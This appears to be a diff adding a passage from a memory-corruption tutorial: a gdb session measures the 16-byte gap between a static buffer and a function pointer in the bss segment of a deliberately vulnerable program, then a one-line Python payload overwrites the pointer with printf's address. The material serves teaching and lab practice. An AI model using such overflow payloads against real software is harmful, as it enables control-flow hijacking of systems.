@@ -1,0 +1,35 @@
+$ gdb -q bss
+Reading symbols from bss...done.
+(gdb) b main
+Breakpoint 1 at 0x804847a: file bss.c, line 29.
+(gdb) r
+Starting program: /home/lain/cvuln/bss/bss 
+
+Breakpoint 1, main (argc=1, argv=0xbffff514) at bss.c:29
+29	  if (argc != 2) {
+(gdb) p &name
+$1 = (char (*)[16]) 0x804a034 <name>
+(gdb) p &funcptr
+$2 = (int (**)(char *, char *)) 0x804a044 <funcptr>
+(gdb) p 0x804a044-0x804a034
+$3 = 16
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 2338] will be killed.
+
+Quit anyway? (y or n) y
+
+There is effectively 16 bytes between name and funcptr. But
+did you read how were the addresses ? Name is less than funcptr.
+Those are addresses of data written in the bss (note the static
+keyword). Overflowing name will write on funcptr !
+
+$ gdb -q bss
+Reading symbols from bss...done.
+(gdb) p printf
+$1 = {<text variable, no debug info>} 0x8048340 <printf@plt>
+(gdb) q
+
+$ ./bss $(python -c "print 'A'*16+'\x40\x83\x04\x08'")
+This is the secret string
